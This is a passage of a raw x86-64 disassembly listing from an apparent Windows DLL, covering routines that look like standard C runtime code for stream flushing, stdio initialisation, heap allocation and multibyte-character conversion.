   18000a922:	72 04                	jb     0x18000a928
   18000a924:	ff 02                	incl   (%rdx)
   18000a926:	eb 37                	jmp    0x18000a95f
   18000a928:	48 8b 43 10          	mov    0x10(%rbx),%rax
   18000a92c:	80 38 00             	cmpb   $0x0,(%rax)
   18000a92f:	75 0f                	jne    0x18000a940
   18000a931:	48 8b 03             	mov    (%rbx),%rax
   18000a934:	48 8b 08             	mov    (%rax),%rcx
   18000a937:	8b 41 14             	mov    0x14(%rcx),%eax
   18000a93a:	d1 e8                	shr    $1,%eax
   18000a93c:	a8 01                	test   $0x1,%al
   18000a93e:	74 1f                	je     0x18000a95f
   18000a940:	48 8b 03             	mov    (%rbx),%rax
   18000a943:	48 8b 08             	mov    (%rax),%rcx
   18000a946:	e8 e5 01 00 00       	call   0x18000ab30
   18000a94b:	83 f8 ff             	cmp    $0xffffffff,%eax
   18000a94e:	74 08                	je     0x18000a958
   18000a950:	48 8b 43 08          	mov    0x8(%rbx),%rax
   18000a954:	ff 00                	incl   (%rax)
   18000a956:	eb 07                	jmp    0x18000a95f
   18000a958:	48 8b 43 18          	mov    0x18(%rbx),%rax
   18000a95c:	83 08 ff             	orl    $0xffffffff,(%rax)
   18000a95f:	48 8b 0f             	mov    (%rdi),%rcx
   18000a962:	e8 a5 03 00 00       	call   0x18000ad0c
   18000a967:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000a96c:	48 83 c4 20          	add    $0x20,%rsp
   18000a970:	5f                   	pop    %rdi
   18000a971:	c3                   	ret
   18000a972:	cc                   	int3
   18000a973:	cc                   	int3
   18000a974:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000a979:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   18000a97e:	56                   	push   %rsi
   18000a97f:	57                   	push   %rdi
   18000a980:	41 56                	push   %r14
   18000a982:	48 83 ec 60          	sub    $0x60,%rsp
   18000a986:	49 8b f1             	mov    %r9,%rsi
   18000a989:	49 8b f8             	mov    %r8,%rdi
   18000a98c:	8b 0a                	mov    (%rdx),%ecx
   18000a98e:	e8 05 d7 ff ff       	call   0x180008098
   18000a993:	90                   	nop
   18000a994:	48 8b 1d d5 12 01 00 	mov    0x112d5(%rip),%rbx        # 0x18001bc70
   18000a99b:	48 63 05 c6 12 01 00 	movslq 0x112c6(%rip),%rax        # 0x18001bc68
   18000a9a2:	4c 8d 34 c3          	lea    (%rbx,%rax,8),%r14
   18000a9a6:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   18000a9ab:	49 3b de             	cmp    %r14,%rbx
   18000a9ae:	0f 84 88 00 00 00    	je     0x18000aa3c
   18000a9b4:	48 8b 03             	mov    (%rbx),%rax
   18000a9b7:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000a9bc:	48 8b 17             	mov    (%rdi),%rdx
   18000a9bf:	48 85 c0             	test   %rax,%rax
   18000a9c2:	74 21                	je     0x18000a9e5
   18000a9c4:	8b 48 14             	mov    0x14(%rax),%ecx
   18000a9c7:	8b c1                	mov    %ecx,%eax
   18000a9c9:	c1 e8 0d             	shr    $0xd,%eax
   18000a9cc:	a8 01                	test   $0x1,%al
   18000a9ce:	74 15                	je     0x18000a9e5
   18000a9d0:	8b c1                	mov    %ecx,%eax
   18000a9d2:	24 03                	and    $0x3,%al
   18000a9d4:	3c 02                	cmp    $0x2,%al
   18000a9d6:	75 05                	jne    0x18000a9dd
   18000a9d8:	f6 c1 c0             	test   $0xc0,%cl
   18000a9db:	75 0e                	jne    0x18000a9eb
   18000a9dd:	0f ba e1 0b          	bt     $0xb,%ecx
   18000a9e1:	72 08                	jb     0x18000a9eb
   18000a9e3:	ff 02                	incl   (%rdx)
   18000a9e5:	48 83 c3 08          	add    $0x8,%rbx
   18000a9e9:	eb bb                	jmp    0x18000a9a6
   18000a9eb:	48 8b 57 10          	mov    0x10(%rdi),%rdx
   18000a9ef:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   18000a9f3:	48 8b 07             	mov    (%rdi),%rax
   18000a9f6:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   18000a9fb:	4c 89 44 24 40       	mov    %r8,0x40(%rsp)
   18000aa00:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   18000aa05:	48 89 4c 24 50       	mov    %rcx,0x50(%rsp)
   18000aa0a:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
   18000aa0f:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   18000aa14:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   18000aa19:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   18000aa1e:	4c 8d 4c 24 28       	lea    0x28(%rsp),%r9
   18000aa23:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   18000aa28:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   18000aa2d:	48 8d 8c 24 88 00 00 	lea    0x88(%rsp),%rcx
   18000aa34:	00 
   18000aa35:	e8 9e fe ff ff       	call   0x18000a8d8
   18000aa3a:	eb a9                	jmp    0x18000a9e5
   18000aa3c:	8b 0e                	mov    (%rsi),%ecx
   18000aa3e:	e8 a9 d6 ff ff       	call   0x1800080ec
   18000aa43:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   18000aa4a:	00 
   18000aa4b:	48 83 c4 60          	add    $0x60,%rsp
   18000aa4f:	41 5e                	pop    %r14
   18000aa51:	5f                   	pop    %rdi
   18000aa52:	5e                   	pop    %rsi
   18000aa53:	c3                   	ret
   18000aa54:	88 4c 24 08          	mov    %cl,0x8(%rsp)
   18000aa58:	55                   	push   %rbp
   18000aa59:	48 8b ec             	mov    %rsp,%rbp
   18000aa5c:	48 83 ec 40          	sub    $0x40,%rsp
   18000aa60:	83 65 28 00          	andl   $0x0,0x28(%rbp)
   18000aa64:	48 8d 45 28          	lea    0x28(%rbp),%rax
   18000aa68:	83 65 20 00          	andl   $0x0,0x20(%rbp)
   18000aa6c:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   18000aa70:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   18000aa74:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   18000aa78:	48 8d 45 10          	lea    0x10(%rbp),%rax
   18000aa7c:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   18000aa80:	48 8d 55 e4          	lea    -0x1c(%rbp),%rdx
   18000aa84:	48 8d 45 20          	lea    0x20(%rbp),%rax
   18000aa88:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   18000aa8c:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   18000aa90:	b8 08 00 00 00       	mov    $0x8,%eax
   18000aa95:	89 45 e0             	mov    %eax,-0x20(%rbp)
   18000aa98:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   18000aa9b:	e8 d4 fe ff ff       	call   0x18000a974
   18000aaa0:	80 7d 10 00          	cmpb   $0x0,0x10(%rbp)
   18000aaa4:	8b 45 20             	mov    0x20(%rbp),%eax
   18000aaa7:	0f 45 45 28          	cmovne 0x28(%rbp),%eax
   18000aaab:	48 83 c4 40          	add    $0x40,%rsp
   18000aaaf:	5d                   	pop    %rbp
   18000aab0:	c3                   	ret
   18000aab1:	cc                   	int3
   18000aab2:	cc                   	int3
   18000aab3:	cc                   	int3
   18000aab4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000aab9:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000aabe:	57                   	push   %rdi
   18000aabf:	48 83 ec 20          	sub    $0x20,%rsp
   18000aac3:	48 8b d9             	mov    %rcx,%rbx
   18000aac6:	8b 49 14             	mov    0x14(%rcx),%ecx
   18000aac9:	8b c1                	mov    %ecx,%eax
   18000aacb:	24 03                	and    $0x3,%al
   18000aacd:	3c 02                	cmp    $0x2,%al
   18000aacf:	75 4b                	jne    0x18000ab1c
   18000aad1:	f6 c1 c0             	test   $0xc0,%cl
   18000aad4:	74 46                	je     0x18000ab1c
   18000aad6:	8b 3b                	mov    (%rbx),%edi
   18000aad8:	2b 7b 08             	sub    0x8(%rbx),%edi
   18000aadb:	83 63 10 00          	andl   $0x0,0x10(%rbx)
   18000aadf:	48 8b 73 08          	mov    0x8(%rbx),%rsi
   18000aae3:	48 89 33             	mov    %rsi,(%rbx)
   18000aae6:	85 ff                	test   %edi,%edi
   18000aae8:	7e 32                	jle    0x18000ab1c
   18000aaea:	48 8b cb             	mov    %rbx,%rcx
   18000aaed:	e8 76 04 00 00       	call   0x18000af68
   18000aaf2:	8b c8                	mov    %eax,%ecx
   18000aaf4:	44 8b c7             	mov    %edi,%r8d
   18000aaf7:	48 8b d6             	mov    %rsi,%rdx
   18000aafa:	e8 85 26 00 00       	call   0x18000d184
   18000aaff:	3b f8                	cmp    %eax,%edi
   18000ab01:	74 0a                	je     0x18000ab0d
   18000ab03:	f0 83 4b 14 10       	lock orl $0x10,0x14(%rbx)
   18000ab08:	83 c8 ff             	or     $0xffffffff,%eax
   18000ab0b:	eb 11                	jmp    0x18000ab1e
   18000ab0d:	8b 43 14             	mov    0x14(%rbx),%eax
   18000ab10:	c1 e8 02             	shr    $0x2,%eax
   18000ab13:	a8 01                	test   $0x1,%al
   18000ab15:	74 05                	je     0x18000ab1c
   18000ab17:	f0 83 63 14 fd       	lock andl $0xfffffffd,0x14(%rbx)
   18000ab1c:	33 c0                	xor    %eax,%eax
   18000ab1e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000ab23:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   18000ab28:	48 83 c4 20          	add    $0x20,%rsp
   18000ab2c:	5f                   	pop    %rdi
   18000ab2d:	c3                   	ret
   18000ab2e:	cc                   	int3
   18000ab2f:	cc                   	int3
   18000ab30:	40 53                	rex push %rbx
   18000ab32:	48 83 ec 20          	sub    $0x20,%rsp
   18000ab36:	48 8b d9             	mov    %rcx,%rbx
   18000ab39:	48 85 c9             	test   %rcx,%rcx
   18000ab3c:	75 0a                	jne    0x18000ab48
   18000ab3e:	48 83 c4 20          	add    $0x20,%rsp
   18000ab42:	5b                   	pop    %rbx
   18000ab43:	e9 0c ff ff ff       	jmp    0x18000aa54
   18000ab48:	e8 67 ff ff ff       	call   0x18000aab4
   18000ab4d:	85 c0                	test   %eax,%eax
   18000ab4f:	75 21                	jne    0x18000ab72
   18000ab51:	8b 43 14             	mov    0x14(%rbx),%eax
   18000ab54:	c1 e8 0b             	shr    $0xb,%eax
   18000ab57:	a8 01                	test   $0x1,%al
   18000ab59:	74 13                	je     0x18000ab6e
   18000ab5b:	48 8b cb             	mov    %rbx,%rcx
   18000ab5e:	e8 05 04 00 00       	call   0x18000af68
   18000ab63:	8b c8                	mov    %eax,%ecx
   18000ab65:	e8 0a 1d 00 00       	call   0x18000c874
   18000ab6a:	85 c0                	test   %eax,%eax
   18000ab6c:	75 04                	jne    0x18000ab72
   18000ab6e:	33 c0                	xor    %eax,%eax
   18000ab70:	eb 03                	jmp    0x18000ab75
   18000ab72:	83 c8 ff             	or     $0xffffffff,%eax
   18000ab75:	48 83 c4 20          	add    $0x20,%rsp
   18000ab79:	5b                   	pop    %rbx
   18000ab7a:	c3                   	ret
   18000ab7b:	cc                   	int3
   18000ab7c:	b1 01                	mov    $0x1,%cl
   18000ab7e:	e9 d1 fe ff ff       	jmp    0x18000aa54
   18000ab83:	cc                   	int3
   18000ab84:	48 8b c4             	mov    %rsp,%rax
   18000ab87:	48 89 58 08          	mov    %rbx,0x8(%rax)
   18000ab8b:	48 89 68 10          	mov    %rbp,0x10(%rax)
   18000ab8f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   18000ab93:	48 89 78 20          	mov    %rdi,0x20(%rax)
   18000ab97:	41 56                	push   %r14
   18000ab99:	48 83 ec 20          	sub    $0x20,%rsp
   18000ab9d:	8b 05 c5 10 01 00    	mov    0x110c5(%rip),%eax        # 0x18001bc68
   18000aba3:	33 db                	xor    %ebx,%ebx
   18000aba5:	bf 03 00 00 00       	mov    $0x3,%edi
   18000abaa:	85 c0                	test   %eax,%eax
   18000abac:	75 07                	jne    0x18000abb5
   18000abae:	b8 00 02 00 00       	mov    $0x200,%eax
   18000abb3:	eb 05                	jmp    0x18000abba
   18000abb5:	3b c7                	cmp    %edi,%eax
   18000abb7:	0f 4c c7             	cmovl  %edi,%eax
   18000abba:	48 63 c8             	movslq %eax,%rcx
   18000abbd:	ba 08 00 00 00       	mov    $0x8,%edx
   18000abc2:	89 05 a0 10 01 00    	mov    %eax,0x110a0(%rip)        # 0x18001bc68
   18000abc8:	e8 4f d6 ff ff       	call   0x18000821c
   18000abcd:	33 c9                	xor    %ecx,%ecx
   18000abcf:	48 89 05 9a 10 01 00 	mov    %rax,0x1109a(%rip)        # 0x18001bc70
   18000abd6:	e8 b9 d6 ff ff       	call   0x180008294
   18000abdb:	48 39 1d 8e 10 01 00 	cmp    %rbx,0x1108e(%rip)        # 0x18001bc70
   18000abe2:	75 2f                	jne    0x18000ac13
   18000abe4:	ba 08 00 00 00       	mov    $0x8,%edx
   18000abe9:	89 3d 79 10 01 00    	mov    %edi,0x11079(%rip)        # 0x18001bc68
   18000abef:	48 8b cf             	mov    %rdi,%rcx
   18000abf2:	e8 25 d6 ff ff       	call   0x18000821c
   18000abf7:	33 c9                	xor    %ecx,%ecx
   18000abf9:	48 89 05 70 10 01 00 	mov    %rax,0x11070(%rip)        # 0x18001bc70
   18000ac00:	e8 8f d6 ff ff       	call   0x180008294
   18000ac05:	48 39 1d 64 10 01 00 	cmp    %rbx,0x11064(%rip)        # 0x18001bc70
   18000ac0c:	75 05                	jne    0x18000ac13
   18000ac0e:	83 c8 ff             	or     $0xffffffff,%eax
   18000ac11:	eb 75                	jmp    0x18000ac88
   18000ac13:	48 8b eb             	mov    %rbx,%rbp
   18000ac16:	48 8d 35 0b fb 00 00 	lea    0xfb0b(%rip),%rsi        # 0x18001a728
   18000ac1d:	4c 8d 35 ec fa 00 00 	lea    0xfaec(%rip),%r14        # 0x18001a710
   18000ac24:	49 8d 4e 30          	lea    0x30(%r14),%rcx
   18000ac28:	45 33 c0             	xor    %r8d,%r8d
   18000ac2b:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   18000ac30:	e8 e3 f3 ff ff       	call   0x18000a018
   18000ac35:	48 8b 05 34 10 01 00 	mov    0x11034(%rip),%rax        # 0x18001bc70
   18000ac3c:	4c 8d 05 ed 0b 01 00 	lea    0x10bed(%rip),%r8        # 0x18001b830
   18000ac43:	48 8b d5             	mov    %rbp,%rdx
   18000ac46:	48 c1 fa 06          	sar    $0x6,%rdx
   18000ac4a:	4c 89 34 03          	mov    %r14,(%rbx,%rax,1)
   18000ac4e:	48 8b c5             	mov    %rbp,%rax
   18000ac51:	83 e0 3f             	and    $0x3f,%eax
   18000ac54:	48 8d 0c c0          	lea    (%rax,%rax,8),%rcx
   18000ac58:	49 8b 04 d0          	mov    (%r8,%rdx,8),%rax
   18000ac5c:	48 8b 4c c8 28       	mov    0x28(%rax,%rcx,8),%rcx
   18000ac61:	48 83 c1 02          	add    $0x2,%rcx
   18000ac65:	48 83 f9 02          	cmp    $0x2,%rcx
   18000ac69:	77 06                	ja     0x18000ac71
   18000ac6b:	c7 06 fe ff ff ff    	movl   $0xfffffffe,(%rsi)
   18000ac71:	48 ff c5             	inc    %rbp
   18000ac74:	49 83 c6 58          	add    $0x58,%r14
   18000ac78:	48 83 c3 08          	add    $0x8,%rbx
   18000ac7c:	48 83 c6 58          	add    $0x58,%rsi
   18000ac80:	48 83 ef 01          	sub    $0x1,%rdi
   18000ac84:	75 9e                	jne    0x18000ac24
   18000ac86:	33 c0                	xor    %eax,%eax
   18000ac88:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000ac8d:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   18000ac92:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   18000ac97:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   18000ac9c:	48 83 c4 20          	add    $0x20,%rsp
   18000aca0:	41 5e                	pop    %r14
   18000aca2:	c3                   	ret
   18000aca3:	cc                   	int3
   18000aca4:	40 53                	rex push %rbx
   18000aca6:	48 83 ec 20          	sub    $0x20,%rsp
   18000acaa:	e8 cd fe ff ff       	call   0x18000ab7c
   18000acaf:	e8 a0 28 00 00       	call   0x18000d554
   18000acb4:	33 db                	xor    %ebx,%ebx
   18000acb6:	48 8b 0d b3 0f 01 00 	mov    0x10fb3(%rip),%rcx        # 0x18001bc70
   18000acbd:	48 8b 0c 0b          	mov    (%rbx,%rcx,1),%rcx
   18000acc1:	e8 42 29 00 00       	call   0x18000d608
   18000acc6:	48 8b 05 a3 0f 01 00 	mov    0x10fa3(%rip),%rax        # 0x18001bc70
   18000accd:	48 8b 0c 03          	mov    (%rbx,%rax,1),%rcx
   18000acd1:	48 83 c1 30          	add    $0x30,%rcx
   18000acd5:	ff 15 0d 54 00 00    	call   *0x540d(%rip)        # 0x1800100e8
   18000acdb:	48 83 c3 08          	add    $0x8,%rbx
   18000acdf:	48 83 fb 18          	cmp    $0x18,%rbx
   18000ace3:	75 d1                	jne    0x18000acb6
   18000ace5:	48 8b 0d 84 0f 01 00 	mov    0x10f84(%rip),%rcx        # 0x18001bc70
   18000acec:	e8 a3 d5 ff ff       	call   0x180008294
   18000acf1:	48 83 25 77 0f 01 00 	andq   $0x0,0x10f77(%rip)        # 0x18001bc70
   18000acf8:	00 
   18000acf9:	48 83 c4 20          	add    $0x20,%rsp
   18000acfd:	5b                   	pop    %rbx
   18000acfe:	c3                   	ret
   18000acff:	cc                   	int3
   18000ad00:	48 83 c1 30          	add    $0x30,%rcx
   18000ad04:	48 ff 25 cd 53 00 00 	rex.W jmp *0x53cd(%rip)        # 0x1800100d8
   18000ad0b:	cc                   	int3
   18000ad0c:	48 83 c1 30          	add    $0x30,%rcx
   18000ad10:	48 ff 25 c9 53 00 00 	rex.W jmp *0x53c9(%rip)        # 0x1800100e0
   18000ad17:	cc                   	int3
   18000ad18:	40 53                	rex push %rbx
   18000ad1a:	48 83 ec 20          	sub    $0x20,%rsp
   18000ad1e:	48 8b d9             	mov    %rcx,%rbx
   18000ad21:	48 83 f9 e0          	cmp    $0xffffffffffffffe0,%rcx
   18000ad25:	77 3c                	ja     0x18000ad63
   18000ad27:	48 85 c9             	test   %rcx,%rcx
   18000ad2a:	b8 01 00 00 00       	mov    $0x1,%eax
   18000ad2f:	48 0f 44 d8          	cmove  %rax,%rbx
   18000ad33:	eb 15                	jmp    0x18000ad4a
   18000ad35:	e8 3e 07 00 00       	call   0x18000b478
   18000ad3a:	85 c0                	test   %eax,%eax
   18000ad3c:	74 25                	je     0x18000ad63
   18000ad3e:	48 8b cb             	mov    %rbx,%rcx
   18000ad41:	e8 4a c9 ff ff       	call   0x180007690
   18000ad46:	85 c0                	test   %eax,%eax
   18000ad48:	74 19                	je     0x18000ad63
   18000ad4a:	48 8b 0d cf 0a 01 00 	mov    0x10acf(%rip),%rcx        # 0x18001b820
   18000ad51:	4c 8b c3             	mov    %rbx,%r8
   18000ad54:	33 d2                	xor    %edx,%edx
   18000ad56:	ff 15 ec 53 00 00    	call   *0x53ec(%rip)        # 0x180010148
   18000ad5c:	48 85 c0             	test   %rax,%rax
   18000ad5f:	74 d4                	je     0x18000ad35
   18000ad61:	eb 0d                	jmp    0x18000ad70
   18000ad63:	e8 94 d4 ff ff       	call   0x1800081fc
   18000ad68:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   18000ad6e:	33 c0                	xor    %eax,%eax
   18000ad70:	48 83 c4 20          	add    $0x20,%rsp
   18000ad74:	5b                   	pop    %rbx
   18000ad75:	c3                   	ret
   18000ad76:	cc                   	int3
   18000ad77:	cc                   	int3
   18000ad78:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000ad7d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   18000ad82:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000ad87:	57                   	push   %rdi
   18000ad88:	48 83 ec 50          	sub    $0x50,%rsp
   18000ad8c:	33 ed                	xor    %ebp,%ebp
   18000ad8e:	49 8b f0             	mov    %r8,%rsi
   18000ad91:	48 8b fa             	mov    %rdx,%rdi
   18000ad94:	48 8b d9             	mov    %rcx,%rbx
   18000ad97:	48 85 d2             	test   %rdx,%rdx
   18000ad9a:	0f 84 38 01 00 00    	je     0x18000aed8
   18000ada0:	4d 85 c0             	test   %r8,%r8
   18000ada3:	0f 84 2f 01 00 00    	je     0x18000aed8
   18000ada9:	40 38 2a             	cmp    %bpl,(%rdx)
   18000adac:	75 11                	jne    0x18000adbf
   18000adae:	48 85 c9             	test   %rcx,%rcx
   18000adb1:	0f 84 28 01 00 00    	je     0x18000aedf
   18000adb7:	66 89 29             	mov    %bp,(%rcx)
   18000adba:	e9 20 01 00 00       	jmp    0x18000aedf
   18000adbf:	49 8b d1             	mov    %r9,%rdx
   18000adc2:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   18000adc7:	e8 c8 ca ff ff       	call   0x180007894
   18000adcc:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   18000add1:	81 78 0c e9 fd 00 00 	cmpl   $0xfde9,0xc(%rax)
   18000add8:	75 22                	jne    0x18000adfc
   18000adda:	4c 8d 0d a7 0e 01 00 	lea    0x10ea7(%rip),%r9        # 0x18001bc88
   18000ade1:	4c 8b c6             	mov    %rsi,%r8
   18000ade4:	48 8b d7             	mov    %rdi,%rdx
   18000ade7:	48 8b cb             	mov    %rbx,%rcx
   18000adea:	e8 05 29 00 00       	call   0x18000d6f4
   18000adef:	48 8b c8             	mov    %rax,%rcx
   18000adf2:	83 c8 ff             	or     $0xffffffff,%eax
   18000adf5:	85 c9                	test   %ecx,%ecx
   18000adf7:	0f 48 c8             	cmovs  %eax,%ecx
   18000adfa:	eb 19                	jmp    0x18000ae15
   18000adfc:	48 39 a8 38 01 00 00 	cmp    %rbp,0x138(%rax)
   18000ae03:	75 2a                	jne    0x18000ae2f
   18000ae05:	48 85 db             	test   %rbx,%rbx
   18000ae08:	74 06                	je     0x18000ae10
   18000ae0a:	0f b6 07             	movzbl (%rdi),%eax
   18000ae0d:	66 89 03             	mov    %ax,(%rbx)
   18000ae10:	b9 01 00 00 00       	mov    $0x1,%ecx
   18000ae15:	40 38 6c 24 48       	cmp    %bpl,0x48(%rsp)
   18000ae1a:	74 0c                	je     0x18000ae28
   18000ae1c:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   18000ae21:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   18000ae28:	8b c1                	mov    %ecx,%eax
   18000ae2a:	e9 b2 00 00 00       	jmp    0x18000aee1
   18000ae2f:	0f b6 0f             	movzbl (%rdi),%ecx
   18000ae32:	48 8d 54 24 38       	lea    0x38(%rsp),%rdx
   18000ae37:	e8 6c 28 00 00       	call   0x18000d6a8
   18000ae3c:	85 c0                	test   %eax,%eax
   18000ae3e:	74 52                	je     0x18000ae92
   18000ae40:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   18000ae45:	44 8b 49 08          	mov    0x8(%rcx),%r9d
   18000ae49:	41 83 f9 01          	cmp    $0x1,%r9d
   18000ae4d:	7e 2f                	jle    0x18000ae7e
   18000ae4f:	41 3b f1             	cmp    %r9d,%esi
   18000ae52:	7c 2a                	jl     0x18000ae7e
   18000ae54:	8b 49 0c             	mov    0xc(%rcx),%ecx
   18000ae57:	8b c5                	mov    %ebp,%eax
   18000ae59:	48 85 db             	test   %rbx,%rbx
   18000ae5c:	4c 8b c7             	mov    %rdi,%r8
   18000ae5f:	ba 09 00 00 00       	mov    $0x9,%edx
   18000ae64:	0f 95 c0             	setne  %al
   18000ae67:	89 44 24 28          	mov    %eax,0x28(%rsp)
   18000ae6b:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   18000ae70:	e8 6b eb ff ff       	call   0x1800099e0
   18000ae75:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   18000ae7a:	85 c0                	test   %eax,%eax
   18000ae7c:	75 0f                	jne    0x18000ae8d
   18000ae7e:	48 63 41 08          	movslq 0x8(%rcx),%rax
   18000ae82:	48 3b f0             	cmp    %rax,%rsi
   18000ae85:	72 3e                	jb     0x18000aec5
   18000ae87:	40 38 6f 01          	cmp    %bpl,0x1(%rdi)
   18000ae8b:	74 38                	je     0x18000aec5
   18000ae8d:	8b 49 08             	mov    0x8(%rcx),%ecx
   18000ae90:	eb 83                	jmp    0x18000ae15
   18000ae92:	8b c5                	mov    %ebp,%eax
   18000ae94:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   18000ae9a:	48 85 db             	test   %rbx,%rbx
   18000ae9d:	4c 8b c7             	mov    %rdi,%r8
   18000aea0:	0f 95 c0             	setne  %al
   18000aea3:	89 44 24 28          	mov    %eax,0x28(%rsp)
   18000aea7:	41 8d 51 08          	lea    0x8(%r9),%edx
   18000aeab:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   18000aeb0:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   18000aeb5:	8b 48 0c             	mov    0xc(%rax),%ecx
   18000aeb8:	e8 23 eb ff ff       	call   0x1800099e0
   18000aebd:	85 c0                	test   %eax,%eax
   18000aebf:	0f 85 4b ff ff ff    	jne    0x18000ae10
   18000aec5:	e8 32 d3 ff ff       	call   0x1800081fc
   18000aeca:	83 c9 ff             	or     $0xffffffff,%ecx
   18000aecd:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   18000aed3:	e9 3d ff ff ff       	jmp    0x18000ae15
   18000aed8:	48 89 2d a9 0d 01 00 	mov    %rbp,0x10da9(%rip)        # 0x18001bc88
   18000aedf:	33 c0                	xor    %eax,%eax
   18000aee1:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   18000aee6:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   18000aeeb:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   18000aef0:	48 83 c4 50          	add    $0x50,%rsp
   18000aef4:	5f                   	pop    %rdi
   18000aef5:	c3                   	ret
   18000aef6:	cc                   	int3
   18000aef7:	cc                   	int3
   18000aef8:	45 33 c9             	xor    %r9d,%r9d
   18000aefb:	e9 78 fe ff ff       	jmp    0x18000ad78
   18000af00:	40 53                	rex push %rbx
   18000af02:	48 83 ec 20          	sub    $0x20,%rsp
   18000af06:	48 8b 05 53 0d 01 00 	mov    0x10d53(%rip),%rax        # 0x18001bc60
   18000af0d:	48 8b da             	mov    %rdx,%rbx
   18000af10:	48 39 02             	cmp    %rax,(%rdx)
   18000af13:	74 16                	je     0x18000af2b
   18000af15:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   18000af1b:	85 05 f7 f8 00 00    	test   %eax,0xf8f7(%rip)        # 0x18001a818
   18000af21:	75 08                	jne    0x18000af2b
   18000af23:	e8 78 04 00 00       	call   0x18000b3a0
   18000af28:	48 89 03             	mov    %rax,(%rbx)
   18000af2b:	48 83 c4 20          	add    $0x20,%rsp
   18000af2f:	5b                   	pop    %rbx
   18000af30:	c3                   	ret
   18000af31:	cc                   	int3
   18000af32:	cc                   	int3
   18000af33:	cc                   	int3
   18000af34:	40 53                	rex push %rbx
   18000af36:	48 83 ec 20          	sub    $0x20,%rsp
   18000af3a:	48 8b 05 e7 06 01 00 	mov    0x106e7(%rip),%rax        # 0x18001b628
   18000af41:	48 8b da             	mov    %rdx,%rbx
   18000af44:	48 39 02             	cmp    %rax,(%rdx)
   18000af47:	74 16                	je     0x18000af5f
   18000af49:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   18000af4f:	85 05 c3 f8 00 00    	test   %eax,0xf8c3(%rip)        # 0x18001a818
   18000af55:	75 08                	jne    0x18000af5f
   18000af57:	e8 f8 e6 ff ff       	call   0x180009654
   18000af5c:	48 89 03             	mov    %rax,(%rbx)
   18000af5f:	48 83 c4 20          	add    $0x20,%rsp
   18000af63:	5b                   	pop    %rbx
   18000af64:	c3                   	ret
   18000af65:	cc                   	int3
   18000af66:	cc                   	int3
   18000af67:	cc                   	int3
   18000af68:	48 83 ec 28          	sub    $0x28,%rsp
   18000af6c:	48 85 c9             	test   %rcx,%rcx
   18000af6f:	75 15                	jne    0x18000af86
   18000af71:	e8 86 d2 ff ff       	call   0x1800081fc
   18000af76:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   18000af7c:	e8 bb b6 ff ff       	call   0x18000663c
   18000af81:	83 c8 ff             	or     $0xffffffff,%eax
   18000af84:	eb 03                	jmp    0x18000af89
   18000af86:	8b 41 18             	mov    0x18(%rcx),%eax
   18000af89:	48 83 c4 28          	add    $0x28,%rsp
   18000af8d:	c3                   	ret
   18000af8e:	cc                   	int3
   18000af8f:	cc                   	int3
   18000af90:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000af95:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000af9a:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   18000af9f:	57                   	push   %rdi
   18000afa0:	48 83 ec 30          	sub    $0x30,%rsp
   18000afa4:	49 8b f9             	mov    %r9,%rdi
   18000afa7:	8b 0a                	mov    (%rdx),%ecx
   18000afa9:	e8 ea d0 ff ff       	call   0x180008098
   18000afae:	90                   	nop
   18000afaf:	48 8d 1d aa 0c 01 00 	lea    0x10caa(%rip),%rbx        # 0x18001bc60
   18000afb6:	48 8d 35 e3 f5 00 00 	lea    0xf5e3(%rip),%rsi        # 0x18001a5a0
   18000afbd:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
